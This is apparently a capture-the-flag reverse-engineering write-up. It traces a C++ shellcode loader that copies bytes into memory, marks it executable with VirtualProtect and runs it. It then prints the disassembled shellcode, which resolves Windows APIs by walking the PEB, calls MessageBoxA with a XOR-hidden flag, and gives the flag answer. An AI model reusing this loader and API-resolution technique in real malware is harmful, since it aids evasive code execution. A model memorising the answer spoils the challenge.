#### As my process of work every time :
#### Start with Detect it easy 
<img width="723" height="665" alt="image" src="https://github.com/user-attachments/assets/aa53c59f-0c18-4aa7-9692-a5f98cd67331" />
So its C++

#### Now to IDA  go throught these function -> Start -> SEH -> main -> main_0 

```
int __cdecl main_0(int argc, const char **argv, const char **envp)
{
  _BYTE v4[12]; // [esp+DCh] [ebp-13Ch] BYREF
  size_t i; // [esp+E8h] [ebp-130h]
  void *Src; // [esp+F4h] [ebp-124h]
  char *v7; // [esp+100h] [ebp-118h]
  size_t Size; // [esp+10Ch] [ebp-10Ch]
  LPVOID lpAddress; // [esp+118h] [ebp-100h]
  DWORD flOldProtect[3]; // [esp+124h] [ebp-F4h] BYREF
  int sub_485E50_1[55]; // [esp+130h] [ebp-E8h] BYREF
  __int16 v12; // [esp+20Ch] [ebp-Ch]
  char v13; // [esp+20Eh] [ebp-Ah]

  qmemcpy(sub_485E50_1, sub_485E50, sizeof(sub_485E50_1));
  v12 = *(&loc_485F2A + 1);
  v13 = unk_485F2E;
  flOldProtect[0] = 0;
  Size = 222;
  v7 = sub_42AB72 + 1;
  for ( Src = sub_42AB72 + *(sub_42AB72 + 1); *Src == 204; Src = Src + 1 )
    ;
  Src = Src + 30;
  for ( i = 0; *(Src + i) != 144; ++i )
    ;
  lpAddress = sub_42C413(sub_485E50_1, Size);
  j__realloc(lpAddress, __CFADD__(i, Size) ? -1 : i + Size);
  VirtualProtect(lpAddress, i + Size, PAGE_EXECUTE_READWRITE, flOldProtect);
  j__memmove(lpAddress + i, lpAddress, Size);
  v4[0] = Size;
  v4[1] = 0;
  v4[2] = 0;
  v4[3] = 0;
  j__memmove(lpAddress, Src, i);
  j__memmove(lpAddress + 20, v4, 4u);
  (lpAddress)();
  return 0;
}
```

We found this code.. the code is about shell loader -> load the shell into lpAddress then make a Virtuallprotect for it and then run it here "   (lpAddress)(); " 

#### So its time for Dynamic Analysis 
##### I will set a break point on (lpAddress)(); and enter it 
<img width="1184" height="420" alt="image" src="https://github.com/user-attachments/assets/73298434-dc12-4965-92bf-24ee4bf910c1" />
 Then jmp : 
 <img width="1154" height="514" alt="image" src="https://github.com/user-attachments/assets/0026112d-5b2f-481a-be1b-9ccfd386c99c" />
 here is the the decryption process of the shell and after that we will enter the shell 
 
```
ug048:00F98881 xor     ecx, ecx
debug048:00F98883 mov     eax, fs:[ecx+30h]
debug048:00F98887 mov     eax, [eax+0Ch]
debug048:00F9888A mov     esi, [eax+14h]
debug048:00F9888D lodsd
debug048:00F9888E xchg    eax, esi
debug048:00F9888F lodsd
debug048:00F98890 mov     ebx, [eax+10h]
debug048:00F98893 mov     edx, [ebx+3Ch]
debug048:00F98896 add     edx, ebx
debug048:00F98898 mov     edx, [edx+78h]
debug048:00F9889B add     edx, ebx
debug048:00F9889D mov     esi, [edx+20h]
debug048:00F988A0 add     esi, ebx
debug048:00F988A2 xor     ecx, ecx
debug048:00F988A4
debug048:00F988A4 loc_F988A4:                             ; CODE XREF: debug048:00F988AE↓j
debug048:00F988A4                                         ; debug048:00F988B7↓j ...
debug048:00F988A4 inc     ecx
debug048:00F988A5 lodsd
debug048:00F988A6 add     eax, ebx
debug048:00F988A8 cmp     dword ptr [eax], 50746547h
debug048:00F988AE jnz     short loc_F988A4
debug048:00F988B0 cmp     dword ptr [eax+4], 41636F72h
debug048:00F988B7 jnz     short loc_F988A4
debug048:00F988B9 cmp     dword ptr [eax+8], 65726464h
debug048:00F988C0 jnz     short loc_F988A4
debug048:00F988C2 mov     esi, [edx+24h]
debug048:00F988C5 add     esi, ebx
debug048:00F988C7 mov     cx, [esi+ecx*2]
debug048:00F988CB dec     ecx
debug048:00F988CC mov     esi, [edx+1Ch]
debug048:00F988CF add     esi, ebx
debug048:00F988D1 mov     edx, [esi+ecx*4]
debug048:00F988D4 add     edx, ebx
debug048:00F988D6 xor     ecx, ecx
debug048:00F988D8 push    ebx
debug048:00F988D9 push    edx
debug048:00F988DA push    ecx
debug048:00F988DB push    41797261h
debug048:00F988E0 push    7262694Ch
debug048:00F988E5 push    64616F4Ch
debug048:00F988EA push    esp
debug048:00F988EB push    ebx
debug048:00F988EC call    edx
debug048:00F988EE add     esp, 0Ch
debug048:00F988F1 pop     ecx
debug048:00F988F2 push    eax
debug048:00F988F3 push    ecx
debug048:00F988F4 mov     cx, 6C6Ch
debug048:00F988F8 push    ecx
debug048:00F988F9 push    642E3233h
debug048:00F988FE push    72657375h
debug048:00F98903 push    esp
debug048:00F98904 call    eax
debug048:00F98906 add     esp, 10h
debug048:00F98909 mov     edx, [esp+4]
debug048:00F9890D xor     ecx, ecx
debug048:00F9890F push    ecx
debug048:00F98910 push    41786Fh
debug048:00F98915 push    42656761h
debug048:00F9891A push    7373654Dh
debug048:00F9891F push    esp
debug048:00F98920 push    eax
debug048:00F98921 call    edx
debug048:00F98923 add     esp, 10h
debug048:00F98926 push    0
debug048:00F98928 mov     ebx, 7D646564h
debug048:00F9892D xor     ebx, eax
debug048:00F9892F push    ebx
debug048:00F98930 mov     ebx, 6F436C6Ch
debug048:00F98935 xor     ebx, eax
debug048:00F98937 push    ebx
debug048:00F98938 mov     ebx, 6568537Bh
debug048:00F9893D xor     ebx, eax
debug048:00F9893F push    ebx
debug048:00F98940 mov     ebx, 67616C66h
debug048:00F98945 xor     ebx, eax
debug048:00F98947 push    ebx
debug048:00F98948 mov     ebx, esp
debug048:00F9894A push    0
debug048:00F9894C push    ebx
debug048:00F9894D push    ebx
debug048:00F9894E push    0
debug048:00F98950 call    eax
debug048:00F98952 add     esp, 20h
debug048:00F98955 pop     ebp
debug048:00F98956 mov     esi, esp
debug048:00F98958 add     esi, 4
debug048:00F9895B retn
```

The shell we got : if you trace throught it you will found the flag as hex in the registers 
<img width="1212" height="610" alt="image" src="https://github.com/user-attachments/assets/de2c25ae-c504-471e-8bcf-7d25b2d6d2e8" />
###### The flag : flag{shellcoded}


